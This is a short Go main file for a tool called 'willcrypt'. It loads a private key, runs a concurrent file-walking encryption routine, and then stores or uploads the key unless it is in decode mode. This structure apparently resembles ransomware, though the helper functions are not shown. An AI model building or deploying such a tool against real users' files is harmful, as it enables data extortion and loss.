package main

import (
	"sync"

	"fmt"
	"os"

	"github.com/sywc670/willcrypt/internal/utils"
)

type Controller struct {
}

func main() {
	priv, err := getPrivKey()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Get priv key error: %v.\n", err)
		os.Exit(1)
	}

	if cfg.Verbose || cfg.Mode == ModeGenRemote {
		fmt.Println()
		fmt.Println("Priv key:")
		fmt.Println(utils.EncodeBase64(utils.Stringify(priv)))
		fmt.Println()
	}

	var wg sync.WaitGroup
	wg.Add(1)

	goWalkCryption(priv, &wg)

	wg.Wait()

	if !cfg.Decode {
		storeOrUpload(priv)
	}

	debug("Done...")
}
